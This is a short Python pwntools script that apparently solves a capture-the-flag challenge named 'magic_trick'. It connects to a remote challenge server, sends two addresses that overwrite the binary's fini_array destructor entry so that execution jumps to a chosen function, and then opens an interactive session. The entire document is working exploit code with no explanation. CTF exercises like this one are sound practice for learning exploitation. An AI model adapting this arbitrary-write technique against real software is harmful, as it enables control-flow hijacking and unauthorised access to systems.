from pwn import *
#s = process('./magic_trick')
s = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

print(s.recvline())
print(s.recvline())
print(s.recvline())

s.sendline('4195943')

print(s.recvline())
s.sendline('6294016')   # 600a00 <__do_global_dtors_aux_fini_array_entry>

s.interactive()
